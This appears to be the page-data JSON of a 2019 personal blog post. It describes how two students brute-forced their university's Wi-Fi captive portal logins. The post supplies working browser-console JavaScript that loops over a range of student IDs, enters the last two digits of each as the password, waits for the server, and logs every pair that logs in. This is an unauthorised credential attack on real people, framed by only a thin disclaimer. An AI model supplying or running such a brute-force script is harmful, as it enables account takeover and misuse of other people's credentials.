{"data":{"site":{"siteMetadata":{"title":"Personal Blog","author":"SANYAM AGARWAL","labels":[{"tag":"nodejs","tech":"Node.js","name":"M11.177 25.3a1.94 1.94 0 0 1-.969-.259l-3.086-1.826c-.46-.257-.235-.349-.083-.402.614-.213.739-.262 1.394-.635.069-.038.159-.024.231.018l2.37 1.407a.304.304 0 0 0 .287 0l9.241-5.333a.292.292 0 0 0 .141-.25V7.355a.3.3 0 0 0-.143-.255l-9.237-5.329a.29.29 0 0 0-.285 0L1.803 7.102a.296.296 0 0 0-.146.253v10.666c0 .102.056.198.145.247l2.532 1.462c1.374.687 2.215-.122 2.215-.935V8.265c0-.149.12-.266.269-.266H7.99c.146 0 .267.117.267.266v10.53c0 1.833-.998 2.885-2.736 2.885-.534 0-.955 0-2.129-.579L.969 19.706A1.953 1.953 0 0 1 0 18.02V7.355c0-.693.371-1.339.969-1.684l9.242-5.34a2.023 2.023 0 0 1 1.942 0l9.241 5.34c.599.346.971.992.971 1.684V18.02c0 .693-.372 1.337-.971 1.686l-9.241 5.335a1.942 1.942 0 0 1-.973.259zm2.855-7.348c-4.045 0-4.892-1.857-4.892-3.414 0-.148.118-.266.266-.266h1.195c.133 0 .245.096.265.226.18 1.216.717 1.831 3.164 1.831 1.946 0 2.775-.441 2.775-1.473 0-.596-.234-1.037-3.26-1.334-2.528-.25-4.093-.809-4.093-2.831 0-1.865 1.572-2.977 4.207-2.977 2.961 0 4.425 1.027 4.611 3.233a.27.27 0 0 1-.267.291h-1.2a.266.266 0 0 1-.259-.209c-.288-1.28-.988-1.689-2.886-1.689-2.126 0-2.373.74-2.373 1.295 0 .673.292.869 3.161 1.248 2.84.375 4.19.907 4.19 2.902 0 2.014-1.678 3.167-4.606 3.167z","size":20,"color":"lightgreen"},{"tag":"git","tech":"Git","name":"M23.546 10.93L13.067.452c-.604-.603-1.582-.603-2.188 0L8.708 2.627l2.76 2.76c.645-.215 1.379-.07 1.889.441.516.515.658 1.258.438 1.9l2.658 2.66c.645-.223 1.387-.078 1.9.435.721.72.721 1.884 0 2.604-.719.719-1.881.719-2.6 0-.539-.541-.674-1.337-.404-1.996L12.86 8.955v6.525c.176.086.342.203.488.348.713.721.713 1.883 0 2.6-.719.721-1.889.721-2.609 0-.719-.719-.719-1.879 0-2.598.182-.18.387-.316.605-.406V8.835c-.217-.091-.424-.222-.6-.401-.545-.545-.676-1.342-.396-2.009L7.636 3.7.45 10.881c-.6.605-.6 1.584 0 2.189l10.48 10.477c.604.604 1.582.604 2.186 0l10.43-10.43c.605-.603.605-1.582 0-2.187","size":20,"color":"white"},{"tag":"javascript","tech":"JavaScript","name":"M0 0h24v24H0V0zm22.034 18.276c-.175-1.095-.888-2.015-3.003-2.873-.736-.345-1.554-.585-1.797-1.14-.091-.33-.105-.51-.046-.705.15-.646.915-.84 1.515-.66.39.12.75.42.976.9 1.034-.676 1.034-.676 1.755-1.125-.27-.42-.404-.601-.586-.78-.63-.705-1.469-1.065-2.834-1.034l-.705.089c-.676.165-1.32.525-1.71 1.005-1.14 1.291-.811 3.541.569 4.471 1.365 1.02 3.361 1.244 3.616 2.205.24 1.17-.87 1.545-1.966 1.41-.811-.18-1.26-.586-1.755-1.336l-1.83 1.051c.21.48.45.689.81 1.109 1.74 1.756 6.09 1.666 6.871-1.004.029-.09.24-.705.074-1.65l.046.067zm-8.983-7.245h-2.248c0 1.938-.009 3.864-.009 5.805 0 1.232.063 2.363-.138 2.711-.33.689-1.18.601-1.566.48-.396-.196-.597-.466-.83-.855-.063-.105-.11-.196-.127-.196l-1.825 1.125c.305.63.75 1.172 1.324 1.517.855.51 2.004.675 3.207.405.783-.226 1.458-.691 1.811-1.411.51-.93.402-2.07.397-3.346.012-2.054 0-4.109 0-6.179l.004-.056z","size":20,"color":"yellow"},{"tag":"css","tech":"CSS","name":"M1.5 0h21l-1.91 21.563L11.977 24l-8.565-2.438L1.5 0zm17.09 4.413L5.41 4.41l.213 2.622 10.125.002-.255 2.716h-6.64l.24 2.573h6.182l-.366 3.523-2.91.804-2.956-.81-.188-2.11h-2.61l.29 3.855L12 19.288l5.373-1.53L18.59 4.414z","size":20,"color":"teal"},{"tag":"html","tech":"HTML","name":"M1.5 0h21l-1.91 21.563L11.977 24l-8.564-2.438L1.5 0zm7.031 9.75l-.232-2.718 10.059.003.23-2.622L5.412 4.41l.698 8.01h9.126l-.326 3.426-2.91.804-2.955-.81-.188-2.11H6.248l.33 4.171L12 19.351l5.379-1.443.744-8.157H8.531z","size":20,"color":"darkorange"},{"tag":"mongodb","tech":"MongoDB","name":"M17.18 9.518c-1.263-5.56-4.242-7.387-4.562-8.086C12.266.939 11.885 0 11.885 0c-.002.019-.004.031-.005.049v.013h-.001c-.002.015-.003.025-.004.039v.015h-.002c0 .01-.002.018-.002.026v.026h-.003c-.001.008-.001.018-.003.025v.021h-.002c0 .007 0 .015-.002.021v.02h-.002c0 .01-.001.022-.002.032v.002c-.003.017-.006.034-.009.05v.008h-.002c-.001.004-.003.008-.003.012v.017h-.003v.022h-.005v.018h-.005v.021h-.004v.019h-.004v.017h-.006v.014h-.004v.018h-.004v.014h-.005v.013H11.8v.015h-.004c-.001.001-.001.003-.001.004v.01h-.003c-.001.002-.001.004-.001.006v.006h-.002c-.001.003-.002.008-.002.01-.003.007-.007.014-.01.021v.002c-.002.002-.004.005-.005.007v.008h-.004v.008h-.005v.008h-.003v.01h-.006v.014h-.004v.004h-.004v.008h-.004v.011h-.004v.008h-.006v.011h-.004v.008h-.005v.008h-.003v.01h-.005v.008h-.004v.006h-.004v.008h-.006V.76h-.004v.006h-.005v.008h-.004v.011h-.005v.004h-.003v.008h-.006v.004h-.004v.01h-.004v.004h-.004v.008h-.005v.006h-.003l-.002.004v.004h-.002c-.001.002-.002.002-.002.004v.001h-.001c-.001.003-.002.005-.004.007v.003h-.001c-.005.006-.008.012-.012.018v.001c-.002.002-.007.006-.009.01v.002h-.001c-.001.001-.003.002-.003.003v.003h-.002l-.003.003v.001h-.001c0 .001-.002.002-.003.004v.004h-.003l-.002.002v.002h-.002c0 .002-.002.002-.002.003v.003h-.004c0 .001-.001.002-.002.003V.92h-.003v.004h-.004V.93h-.004v.008h-.005V.93h-.005v.004h-.004V.94h-.005v.008h-.005v.004h-.004v.006h-.004v.004h-.004V.97h-.006v.004h-.004V.98h-.005v.004h-.004v.005h-.005v.01h-.002v.004h-.006v.005h-.004v.002h-.004v.004h-.005v.01h-.004v.004h-.005v.004h-.004v.006h-.005v.004h-.005v.004h-.004v.004h-.004v.01h-.004v.005h-.006v.004h-.004v.004h-.005v.006h-.004v.004h-.005v.007h-.004v.004h-.006V1.1h-.002v.004h-.004v.004h-.005v.004h-.004v.006h-.005v.004h-.003c-.001.001-.001.002-.001.002v.002h-.002l-.004.004s-.002.002-.004.003v.006h-.004v.005h-.004v.004h-.004v.004h-.003l-.003.003v.003h-.002l-.002.002v.003h-.002c-.005.006-.007.01-.014.016-.002.002-.008.007-.012.01-.012.008-.027.021-.039.032-.008.005-.016.012-.022.017v.001h-.001c-.016.013-.031.025-.049.039v.001c-.024.02-.047.039-.074.062V1.34h-.002c-.057.047-.117.1-.186.159V1.5h-.001c-.169.148-.37.338-.595.568l-.015.015-.004.004C9 3.494 6.857 6.426 6.631 11.164c-.02.392-.016.773.006 1.144v.009c.109 1.867.695 3.461 1.428 4.756v.001c.292.516.607.985.926 1.405v.001c1.102 1.455 2.227 2.317 2.514 2.526.441 1.023.4 2.779.4 2.779l.644.215s-.131-1.701.053-2.522c.057-.257.192-.476.349-.662.106-.075.42-.301.797-.645.018-.019.028-.036.044-.054 1.521-1.418 4.362-4.91 3.388-10.599z","size":20,"color":"green"},{"tag":"vscode","tech":"VS Code","name":"M23.15 2.587L18.21.21a1.494 1.494 0 0 0-1.705.29l-9.46 8.63-4.12-3.128a.999.999 0 0 0-1.276.057L.327 7.261A1 1 0 0 0 .326 8.74L3.899 12 .326 15.26a1 1 0 0 0 .001 1.479L1.65 17.94a.999.999 0 0 0 1.276.057l4.12-3.128 9.46 8.63a1.492 1.492 0 0 0 1.704.29l4.942-2.377A1.5 1.5 0 0 0 24 20.06V3.939a1.5 1.5 0 0 0-.85-1.352zm-5.146 14.861L10.826 12l7.178-5.448v10.896z","size":20,"color":"deepskyblue"}]}},"allMarkdownRemark":{"totalCount":1,"edges":[{"node":{"excerpt":"Disclaimer: This post is for educational purposes only and we are not responsible for the consequences of your actions. Even more so, this post suggests using strong passwords.Well, the clickbaity…","html":"<p><strong>Disclaimer</strong>: This post is for educational purposes only and <strong>we are not</strong> responsible for the consequences of your actions. <strong>Even more so, this post suggests using strong passwords.</strong></p>\n<p>Well, the clickbaity title would suggest a guide of hacking into the SAP but don’t get too excited :p</p>\n<p>This is an account of what <a href=\"https://www.linkedin.com/in/makkoncept/\">Mayank</a> and I did last week to get the login passwords of some students into the Captive Portal.</p>\n<p>All we need is some JavaScript magic and trust in human laziness.  </p>\n<h2>The strategy</h2>\n<p>Captive Portal is an Internet Authentication Gateway of DIT University Wifi <em>a.k.a</em> DIT University Students have a password which they can use along with their SAP Id to login and use University Wifi.</p>\n<p><img src=\"https://lh5.googleusercontent.com/wWeP6RPaDj0-lH8oh_rtdm5IRmakK02QzEZ3lvAdruk8WQT6ce4y_rl3ImD3E2z4bl8uaQUgDjEDJ4-hapF3pGMCwKn3SQaIirbWNkAnywgEeKPT0wCbDuavhQ2DanZvyMPMfzoe\" alt=\"captive-portal-screenshot\"></p>\n<p>Captive-Portal</p>\n<p>Most students don’t bother to change their password or set a trivial one (like last 2 - 4 digits of their SAP Id) given the fact that the only purpose it serves is to let them use Wifi. Also, there is no enforcement of a strong password in the Captive Portal. You can literally have a password with only one character!</p>\n<p>Therefore, a brute force solution would be to start from a random SAP Id, enter a trivial password like the last 2 digits of SAP id. If you are lucky, you will get in.</p>\n<p>The obvious next steps are to automate the above process with JavaScript.  </p>\n<h2>Code</h2>\n<p>Open the JavaScript console in browser dev tools and select a username and password field and the login button.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">const username = document.getElementById(&quot;username&quot;);\nconst password = document.getElementById(&quot;password&quot;);\nconst loginButton = document.getElementById(&quot;loginbutton&quot;);</code></pre></div>\n<p>Start the loop from a random SAP Id and enter SAP Id as username, any pattern as a password and click the login button</p>\n<p>Here, we are using the last 2 digits of SAP Id as a password.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">function runCode() {\n    for (let i = 1000008500; i&lt;1000008700; i++) {\n        username.value = i;\n        password.value = i % 100;\n        loginButton.click();\n    }\n}</code></pre></div>\n<p>Having thought that we were done here, Sanyam and I ran the code only to find it fails.</p>\n<p><img src=\"images/ezgif.com-crop.gif\" alt=\"demo-gif-fail\"></p>\n<p>Fail!  <strong>(╯°□°）╯︵ ┻━┻</strong></p>\n<p>There is a fundamental problem in the code. For any iteration, after we click the login button, the server will take some time to validate the credentials but JavaScript does not wait for it and enters then next username, password and clicks the login button again. Therefore the credentials are not validated at all, and the loop keeps on running till it reaches the last SAP Id.</p>\n<p>To solve this, we have to delay the execution of the function for some time for the validation to complete. JavasScript does not have a native sleep function like other languages (sleep for <a href=\"https://www.programiz.com/python-programming/time/sleep\">Python</a>, <a href=\"https://www.journaldev.com/1020/thread-sleep-java\">Java</a>). We first thought of using the <a href=\"https://developer.mozilla.org/en-US/docs/Web/API/WindowOrWorkerGlobalScope/setTimeout\">setTimeout</a> function but it obviously didn’t work as it is asynchronous.</p>\n<p>The next thing we did was of utmost stupidity. We used the following function to delay the execution.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">const sleep = (delay) =&gt; {\n    var start = new Date().getTime();\n    while (new Date().getTime() &lt; start + delay);\n}</code></pre></div>\n<p>Don't try this on your computer. Just don't.</p>\n<p>An effective sleep function in javascript can be made using \"Promises\" and \"async/await\"</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">const sleep = (milliseconds) =&gt; {\n  return new Promise(resolve =&gt; setTimeout(resolve, milliseconds))\n}</code></pre></div>\n<p>We will not go into details of the code here, but basically what the sleep function here does is return a promise which is resolved after the specified milliseconds. So we can now use <code class=\"language-text\">await sleep(1000)</code> in our original function to let it sleep for 1 second. Note that we must now change our function to an async function as await can only be used in an async function. (you can learn more about <a href=\"https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/async_function\">async/await</a> and <a href=\"https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Promise\">promises</a>)</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">async function runCode() {\n    for (let i = 1000008500; i&lt;1000008700; i++) {\n        username.value = i;\n        password.value = i%100;\n        loginButton.click();\n        await sleep(1000);\n        if (loginButton.innerText === &quot;Sign out&quot;) {\n            console.log(`SAP id is ${i}`);\n            console.log(`password is ${i%100}`);\n            loginButton.click();\n        }\n    }\n}</code></pre></div>\n<p><img src=\"images/ezgif.com-crop-2.gif\" alt=\"final-demo-gif\"></p>\n<p>Voila!</p>\n<h2>Fin.</h2>\n<p>Again, read the <a href=\"#disclaimer\">disclaimer</a> above. And please use strong passwords 😅</p>","id":"d898d75b-d1bd-598f-8581-b28145bbb88c","frontmatter":{"title":"Hacking Captive Portal (Internet Authentication Gateway) passwords","date":"August 22, 2019","tags":["javascript","console","html"]},"fields":{"slug":"/hacking-captive-portal-dit-university-internet-authentication-gateway-passwords/"}}}]}},"pageContext":{"isCreatedByStatefulCreatePages":true}}